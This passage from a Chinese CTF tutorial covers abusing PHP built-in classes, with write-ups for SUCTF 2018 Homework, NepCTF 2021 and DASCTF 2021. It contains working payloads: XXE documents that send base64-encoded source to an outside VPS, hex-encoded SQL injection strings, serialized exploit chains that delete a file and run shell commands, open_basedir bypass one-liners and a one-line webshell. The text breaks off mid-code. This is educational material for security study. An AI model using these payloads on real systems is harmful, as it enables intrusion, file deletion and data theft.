方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码： $a = array(reset($_SESSION), 'welcome_to_the_lctf2018'); call_user_func($b, $a); 我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了： call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018')); call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。 下面我们用extract()将$b覆盖成call_user_func()，reset($_SESSION)就是$_SESSION['name']，所以我们传入name=SoapClient 最后的call_user_func($b, $a)就变成了call_user_func(array('SoapClient','welcome_to_the_lctf2018')),即call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)。 因为SoapClient对象中没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()从而发送请求，造成SSRF去访问flag.php。 如上图，访问之后，自动发送了http请求，访问session文件，此时PHP反序列化引擎会反序列化你之前输入的内容，于是成功绕过本地地址访问的限制，于是变量flag存入session，然后我们接着访问index.php，页面会输出session文件的内容，回显flag 这一步由于会触发SSRF请求，因此会等待很久。 10.4 SimpleXMLElement 类进行 XXE SimpleXMLElement 类 SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。 官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下： public SimpleXMLElement::__construct( string $data, int $options = 0, bool $dataIsURL = false, string $namespaceOrPrefix = \"\", bool $isPrefix = false ) 其中值得注意的是$data和$data_is_url这两个参数： $data：格式正确的XML字符串，或者XML文档的路径或URL（如果$data_is_url为true）。 $data_is_url：默认情况下$data_is_url为false。使用true指定$data的路径或URL到一个XML文件，而不是字符串数据。 可以看到通过设置第三个参数 $data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。 这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。 example： &lt;?php $xml = &lt;&lt;&lt;EOF &lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM \"http://t6n089.ceye.io\"&gt;%remote;]&gt; ]&gt; &lt;x&gt;&amp;xee&lt;/x&gt; EOF; $xml_class = new SimpleXMLElement($xml, LIBXML_NOENT); var_dump($xml_class); ?&gt; 实现了引用外部实体。同理我们可以让上面代码中的$xml中的内容放到自己的VPS中，然后在新建类对象的时候第一个参数写的是URL地址去实现XML文件的远程载入，这样也能实现XXE。 [SUCTF 2018]Homework 题目分析 先注册账号登陆作业平台。看到一个calc计算器类。有两个按钮，一个用于调用calc类实现两位数的四则运算。另一个用于提交代码。 点击CALC按钮，观察返回的结果和URL 再根据calc类里面的内容，不难判断得知，这里通过module传参去调用calc类，然后剩下3个变量是calc($args1,$method,$args2)函数中参数。 SimpleXMLElement 类的使用 首先，我们在vps（124.220.233.26）上构造如下evil.xml、send.xml这两个文件。 evil.xml： &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE try[ &lt;!ENTITY % int SYSTEM \"https://VPS/tmp/semd.xml\"&gt; %int; %all; %send; ]&gt; send.xml： &lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;\"&gt; 然后在url中构造如下： /show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true 然后我们就可以看web日志：（这个作者也是埋坑呢，这里他用的https协议，我们改成http即可） base64解码，得到源码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;PHP Homework Platform&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;script type=\"application/x-javascript\"&gt; addEventListener(\"load\", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt; &lt;link href=\"css/font-awesome.min.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\"&gt; &lt;link href=\"css/snow.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" /&gt; &lt;link href=\"css/style.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\" /&gt; &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"images/Styles/SyntaxHighlighter.css\"&gt;&lt;/link&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- /home/wwwroot/default--&gt; &lt;div class=\"snow-container\"&gt; &lt;div class=\"snow foreground\"&gt;&lt;/div&gt; &lt;div class=\"snow foreground layered\"&gt;&lt;/div&gt; &lt;div class=\"snow middleground\"&gt;&lt;/div&gt; &lt;div class=\"snow middleground layered\"&gt;&lt;/div&gt; &lt;div class=\"snow background\"&gt;&lt;/div&gt; &lt;div class=\"snow background layered\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=\"top-buttons-agileinfo\"&gt; &lt;/div&gt; &lt;h1&gt;PHP Homework Platform&lt;/h1&gt; &lt;div class=\"main-agileits\"&gt; &lt;?php include(\"function.php\"); include(\"config.php\"); $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } ?&gt; &lt;textarea name=\"code\" class=\"php\" rows=\"20\" cols=\"55\" disabled=\"disabled\"&gt; &lt;?php readfile(\"./calc.php\");?&gt; &lt;/textarea&gt; &lt;div class=\"top-buttons-agileinfo\"&gt; &lt;a href=\"show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2\"&gt;calc&lt;/a&gt; &lt;a href=\"submit.php\" class=\"active\"&gt;Submit homework&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type=\"text/javascript\" src=\"js/jquery-2.1.4.min.js\"&gt;&lt;/script&gt; &lt;script class=\"javascript\" src=\"images/Scripts/shBrushPhp.js\"&gt;&lt;/script&gt; &lt;script class=\"javascript\"&gt; dp.SyntaxHighlighter.HighlightAll('code'); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; SQL二次注入 index.php &lt;?php include(\"function.php\"); include(\"config.php\"); $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } ?&gt; &lt;?php readfile(\"./calc.php\");?&gt; function.php &lt;?php function sql_result($sql,$mysql){ if($result=mysqli_query($mysql,$sql)){ $result_array=mysqli_fetch_all($result); return $result_array; }else{ echo mysqli_error($mysql); return \"Failed\"; } } function upload_file($mysql){ if($_FILES){ if($_FILES['file']['size']&gt;2*1024*1024){ die(\"File is larger than 2M, forbidden upload\"); } if(is_uploaded_file($_FILES['file']['tmp_name'])){ if(!sql_result(\"select * from file where filename='\".w_addslashes($_FILES['file']['name']).\"'\",$mysql)){ $filehash=md5(mt_rand()); if(sql_result(\"insert into file(filename,filehash,sig) values('\".w_addslashes($_FILES['file']['name']).\"','\".$filehash.\"',\".(strrpos(w_addslashes($_POST['sig']),\")\")?\"\":w_addslashes($_POST['sig'])).\")\",$mysql)==\"Failed\") die(\"Upload failed\"); $new_filename=\"./upload/\".$filehash.\".txt\"; move_uploaded_file($_FILES['file']['tmp_name'], $new_filename) or die(\"Upload failed\"); die(\"Your file \".w_addslashes($_FILES['file']['name']).\" upload successful.\"); }else{ $hash=sql_result(\"select filehash from file where filename='\".w_addslashes($_FILES['file']['name']).\"'\",$mysql) or die(\"Upload failed\"); $new_filename=\"./upload/\".$hash[0][0].\".txt\"; move_uploaded_file($_FILES['file']['tmp_name'], $new_filename) or die(\"Upload failed\"); die(\"Your file \".w_addslashes($_FILES['file']['name']).\" upload successful.\"); } }else{ die(\"Not upload file\"); } } } function w_addslashes($string){ return addslashes(trim($string)); } function do_api($module,$args){ $class = new ReflectionClass($module); $a=$class-&gt;newInstanceArgs($args); } ?&gt; show.php &lt;?php include(\"function.php\"); include(\"config.php\"); include(\"calc.php\"); if(isset($_GET['action'])&amp;&amp;$_GET['action']==\"view\"){ if($_SERVER[\"REMOTE_ADDR\"]!==\"127.0.0.1\") die(\"Forbidden.\"); if(!empty($_GET['filename'])){ $file_info=sql_result(\"select * from file where filename='\".w_addslashes($_GET['filename']).\"'\",$mysql); $file_name=$file_info['0']['2']; echo(\"file code: \".file_get_contents(\"./upload/\".$file_name.\".txt\")); $new_sig=mt_rand(); sql_result(\"update file set sig='\".intval($new_sig).\"' where id=\".$file_info['0']['0'].\" and sig='\".$file_info['0']['3'].\"'\",$mysql); die(\"&lt;br&gt;new sig:\".$new_sig); }else{ die(\"Null filename\"); } } $username=w_addslashes($_COOKIE['user']); $check_code=$_COOKIE['cookie-check']; $check_sql=\"select password from user where username='\".$username.\"'\"; $check_sum=md5($username.sql_result($check_sql,$mysql)['0']['0']); if($check_sum!==$check_code){ header(\"Location: login.php\"); } $module=$_GET['module']; $args=$_GET['args']; do_api($module,$args); ?&gt; show.php中，限制了 ip 只能是127.0.0.1，说明只能通过 XXE 去触发SSRF。这里根据filename获取数据库中的 sig 然后进行 update 操作，但没有对 sig 值进行过滤，导致二次注入。 再看一下function.php中的upload_file()上传文件部分，首先他会判断 filename 是否存在，如果不存在就会插入数据库，这里 sig 没有用单引号保护，但是用了 addslashes() 进行转义，而我们要插入二次注入的语句必须得有单引号，这个时候就可以用 hex 编码进行绕过。 因为sql_result()函数中会输出 sql 错误，所以我们用 updatexml 函数进行报错注入。构造 payload: 数据库可以识别16进制并解码 '||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||' //hex编码之后 0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27 //由于报错的字符数有限制，需要用reverse再输出一次 '||extractvalue(1,concat(0x7e,(select reverse(flag) from flag),0x7e))||' //hex编码之后 0x277c7c6578747261637476616c756528312c636f6e63617428307837652c2873656c656374207265766572736528666c6167292066726f6d20666c6167292c3078376529297c7c27 修改send.xml &lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=http://127.0.0.1/show.php?action=view&amp;filename=1.txt\"&gt; &lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;\"&gt; 上传成功之后再利用SimpleXMLElement类进行SSRF，也就是访问URL： /show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true 之后查看web访问日志，将得到的结果base64解码之后即可。（注意由于分了2次上传，因此两次的文件名字需要不一样才行） 这里不知道为啥一直实现不了,就看个思路吧… 10.5 ZipArchive 类来删除文件 ZipArchive 类 PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。 下面列举几个常见的类方法： - `ZipArchive::addEmptyDir`：添加一个新的文件目录 - `ZipArchive::addFile`：将文件添加到指定zip压缩包中 - `ZipArchive::addFromString`：添加新的文件同时将内容添加进去 - `ZipArchive::close`：关闭ziparchive - `ZipArchive::extractTo`：将压缩包解压 - `ZipArchive::open`：打开一个zip压缩包 - `ZipArchive::deleteIndex`：删除压缩包中的某一个文件，如：`deleteIndex(0)`代表删除第一个文件 - `ZipArchive::deleteName`：删除压缩包中的某一个文件名称，同时也将文件删除 - …… 我们来重点看看 ZipArchive::open 方法： ZipArchive::open ( string $filename [, int $flags ] ) : mixed 该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。 - `$filename`：要打开的ZIP存档的文件名。 - `$flags`：用于打开档案的模式。有以下几种模式： - `ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。 - `ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。 - `ZipArchive::RDONLY`：只读模式打开压缩包。 - `ZipArchive::EXCL`：如果压缩包已经存在，则出错。 - `ZipArchive::CHECKCONS`：对压缩包执行额外的一致性检查，如果失败则显示错误。 注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将$flags赋值为8。 也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。 example： $a = new ZipArchive(); $a-&gt;open('1.txt',ZipArchive::OVERWRITE); // ZipArchive::OVERWRITE: 总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖 // 因为没有保存，所以效果就是删除了1.txt [NepCTF 2021]梦里花开牡丹亭 找了半天没找到复现环境，就跟着wp走一遍吧 进入题目，给出源码： &lt;?php highlight_file(__FILE__); error_reporting(0); include('shell.php'); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){ if(md5($this-&gt;register)===\"21232f297a57a5a743894a0e4a801fc3\"){ // admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!'); } } } class register{ public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } } } class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ // 当waf.txt没读取成功时才能得到flag shell($content); }else{ echo file_get_contents($filename.\".php\"); // filename=php://filter/read=convert.base64-encode/resource=shell } } } if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser'])); } 这是一道反序列化题目，但是前面加了一个简单的PHP特性。 1. 数组绕过哈希比较 由于md5()和sha1()函数都无法处理数组，因此传入一个数组会返回false。因此这里可以绕过需要两个不同的数但是其哈希值要相等。 example： 2. 利用php://filter读文件 我们可以看到Open类里面的open()方法，当waf.txt文件存在的时候会执行echo file_get_contents($filename.\".php\");，而调用这个类方法是在Login类里面的checking()方法， 而调用Login类的checking()方法的是Game类里面的__destruct()内置方法，因此我们就能够找到一条完整的利用链了，POC： 自己大概也打通了，不错… &lt;?php class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new Open(); $poc-&gt;filename = \"php://filter/read=convert.base64-encode/resource=shell\"; $poc-&gt;content = \"xxx\"; echo base64_encode(serialize($poc)); ?&gt; 得到： Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjM6IjEyMyI7fQ== 执行payload读取到shell.php的源码base64编码： 果然啊，复现的时候，发现原来是waf.txt没创建，导致代码走不通… shell.php &lt;?php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(\"NO\"); }else{ return system($cmd); } }else{ die('so long!'); } } 3. 利用ZipArchive类删除文件 联合index.php里面的Open类： class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ // 当waf.txt没读取成功时才能得到flag shell($content); }else{ echo file_get_contents($filename.\".php\"); // filename=php://filter/read=convert.base64-encode/resource=shell } } } 可知我们只要使 file_get_contents('waf.txt') 读取失败就可以进入 shell($content) 来执行系统命令。所以我们应该要想办法将waf.txt这个文件删除，这样就会读取失败，才能执行我们的命令。 刚好我们的ZipArchive类里面也有一个open()方法， ZipArchive::open($filename, $flags = null) 如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE = 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。 所以我们利用ZipArchive原生类调用open方法，即可将即可将$filename（waf.txt）删除： &lt;?php // highlight_file(__FILE__); error_reporting(-1); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new ZipArchive(); $poc-&gt;filename = \"waf.txt\"; $poc-&gt;content = 8; echo base64_encode(serialize($poc)); ?&gt; 得到payload： Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30= 执行之后即可删除waf.txt。注意我这里在本地复现的时候需要把目录文件夹的所有权和分组都给到www-data才能成功删除文件 我这里是将文件夹权限设置为www即可 4. 命令执行绕过黑名单和字符数限制 最后一步就是执行我们的命令去读flag，回过头来看我们的shell.php &lt;?php function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(\"NO\"); }else{ return system($cmd); } }else{ die('so long!'); } } 这里首先限制了我们的命令长度要小于10个字符，然后字符里面不能有黑名单字符出现，这里我们绕过的方法很多，举个例： n\\l /flag POC: &lt;?php // highlight_file(__FILE__); error_reporting(-1); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; } class login{ public $file; public $filename; public $content; } class Open{ } $poc = new Game(); $poc-&gt;username = \"admin\"; $poc-&gt;password = \"admin\"; $poc-&gt;register = \"admin\"; $poc-&gt;file = new Open(); $poc-&gt;filename = \"xxx\"; $poc-&gt;content = \"n\\l /flag\"; echo base64_encode(serialize($poc)); ?&gt; 得到payload：这里估计是文件位置放的不对,我总是读不到 Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6MzoieHh4IjtzOjc6ImNvbnRlbnQiO3M6OToiblxsIC9mbGFnIjt9 10.6 遍历目录类 DirectoryIterator 类 DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。 类摘要： DirectoryIterator extends SplFileInfo implements SeekableIterator { /* 方法 */ public __construct ( string $path ) public current ( ) : DirectoryIterator public getATime ( ) : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename ( ) : string public getGroup ( ) : int public getInode ( ) : int public getMTime ( ) : int public getOwner ( ) : int public getPath ( ) : string public getPathname ( ) : string public getPerms ( ) : int public getSize ( ) : int public getType ( ) : string public isDir ( ) : bool public isDot ( ) : bool public isExecutable ( ) : bool public isFile ( ) : bool public isLink ( ) : bool public isReadable ( ) : bool public isWritable ( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string // 以字符串形式获取文件名 public valid ( ) : bool } 利用 DirectoryIterator 类遍历指定目录里的文件： 如果我们这样： &lt;?php $dir=new DirectoryIterator(\"/\"); echo $dir; 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名： 也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径： glob:// 协议用来查找匹配的文件路径模式 &lt;?php $dir=new DirectoryIterator(\"glob:///*flag*\"); echo $dir; 如果想输出全部的文件名我们还需要对$dir对象进行遍历： &lt;?php $dir=new DirectoryIterator(\"/\"); foreach($dir as $f){ echo($f.'&lt;br&gt;'); } FilesystemIterator 类 FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。 该类的使用方法与DirectoryIterator 类也是基本相同的： &lt;?php $dir=new FilesystemIterator(\"/\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"glob:///*flag*\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"/\"); foreach($dir as $f){ echo($f.'&lt;br&gt;'); } GlobIterator 类 与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。 类摘要： GlobIterator extends FilesystemIterator implements SeekableIterator , Countable { /* 方法 */ public __construct ( string $pattern , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ) public count ( ) : int /* 继承的方法 */ public FilesystemIterator::__construct ( string $path , int $flags = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO | FilesystemIterator::SKIP_DOTS ) public FilesystemIterator::current ( ) : mixed public FilesystemIterator::getFlags ( ) : int public FilesystemIterator::key ( ) : string public FilesystemIterator::next ( ) : void public FilesystemIterator::rewind ( ) : void public FilesystemIterator::setFlags ( int $flags = ? ) : void } 我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候： &lt;?php $dir=new DirectoryIterator(\"/\"); echo $dir; &lt;?php $dir=new FilesystemIterator(\"/\"); echo $dir; 其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(/*flag*)： 使用可遍历目录类绕过 open_basedir DirectoryIterator类或者FilesystemIterator类与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 example: &lt;?php $dir = $_GET['whoami']; $a = new DirectoryIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用 } ?&gt; # payload一句话的形式: $a = new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f-&gt;__toString().'&lt;br&gt;');} 使用FilesystemIterator类同理。 而使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。 example: &lt;?php $dir = $_GET['whoami']; $a = new GlobIterator($dir); foreach($a as $f){ echo($f-&gt;__toString().'&lt;br&gt;');// 不加__toString()也可,因为echo可以自动调用 } ?&gt; # payload一句话的形式: $a = new FilesystemIterator(\"/*\");foreach($a as $f){echo($f-&gt;__toString().'&lt;br&gt;');} 10.7 可读取文件类 SplFileObject 类 SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：https://www.php.net/manual/zh/class.splfileobject.php 该类的构造方法可以构造一个新的文件对象用于后续的读取。 我们可以像类似下面这样去读取一个文件的一行： &lt;?php $context = new SplFileObject('/etc/passwd'); echo $context; 但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历： &lt;?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } //D:\\labwork\\phpstudy_pro\\WWW\\1.txt [DASCTF MAR 2021]ez_serialize 进入题目，给出源码： &lt;?php error_reporting(0); highlight_file(__FILE__); class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = \"B\"; $this-&gt;para = \"ctfer\"; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() // 可以直接绕过__wakeup()方法的执行 { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); } } class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (\"hello \".$this-&gt;a); } } class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|\"|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; } } if(isset($_GET['pop'])){ unserialize($_GET['pop']); } else{ $a=new A; } 这是一道PHP反序列化的题目，题目里面没有给出什么危险的函数调用，因此应该要想到是原生类的利用。留意这一段代码： public function __wakeup() // 可以直接绕过__wakeup()方法的执行 { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); } 我们从反序列化的__wakeup()函数入手，看到新建了一个C的类对象，然后使用C类里面的check()方法对$para和$class这两个属性进行检查，看是否存在非法的字符，没有问题之后就使用echo new $this-&gt;class ($this-&gt;para);语句将新建类返回的内容输出。 目录遍历类 首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录： &lt;?php class A{ public $class='FilesystemIterator'; // FilesystemIterator(\"/var/www/html\") public $para=\"/var/www/html/\"; public $check; } $poc = new A(); echo serialize($poc); 得到payload： O:1:\"A\":3:{s:5:\"class\";s:18:\"FilesystemIterator\";s:4:\"para\";s:14:\"/var/www/html/\";s:5:\"check\";N;} 执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE 继续往下找: &lt;?php class A{ public $class='FilesystemIterator'; // FilesystemIterator(\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE\") public $para=\"/var/www/html/\"; public $check; } $poc = new A(); echo serialize($poc); 在这个文件夹下找到了flag.php 文件读取类 然后我们使用 SplFileObject 类读取flag.php就行了： &lt;?php class A{ public $class='SplFileObject'; // SplFileObject(\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\") public $para=\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\"; public $check; } $poc = new A(); echo serialize($poc); 得到payload： O:1:\"A\":3:{s:5:\"class\";s:13:\"SplFileObject\";s:4:\"para\";s:55:\"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php\";s:5:\"check\";N;} 10.8 反射类Reflection 它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。 ReflectionMethod 类获取类方法的相关信息 ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 getDocComment() 方法，我们可以用它来获取类中各个函数注释内容 example: &lt;?php class FlagIsHere { /** * 这是测试方法 * flag{success} * @return int */ protected function GiveMeFlag() { return 9999; } } $ref = new ReflectionMethod('FlagIsHere','GiveMeFlag'); var_dump($ref-&gt;getDocComment()); 输出： ReflectionClass类读取类的属性和方法名 ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。 public ReflectionClass::__construct(mixed $argument) $argument：既可以是包含类名的字符串（string）也可以是对象（object）。 用法如下 example： 把类里面属性和方法的名字都能够显示出来。 ReflectionFunction类写Webshell ReflectionFunction 类报告了一个函数的有关信息。其中invokeArgs()方法能够用来写Webshell。 public ReflectionFunction::invokeArgs(array $args): mixed $args：传递给函数的参数是一个数组，像call_user_func_array()的工作方式。 example: &lt;?php function title($title, $name) { return sprintf(\"%s. %s\\r \", $title, $name); } $function = new ReflectionFunction('title'); echo $function-&gt;invokeArgs(array('Dr', 'Phil')); ?&gt; 我们可以使用这个方法来写Webshell： &lt;?php $func = new ReflectionFunction($_GET[m]); echo $func-&gt;invokeArgs(array($_GET[c])); ?&gt; [红帽杯 2021 final]upload 由于线下是AWDplus的模式，需要挖洞并且修洞，直接给出了源码，有3个文件。 class.php &lt;?php session_start(); function red($fileinfo){ foreach($fileinfo as $key 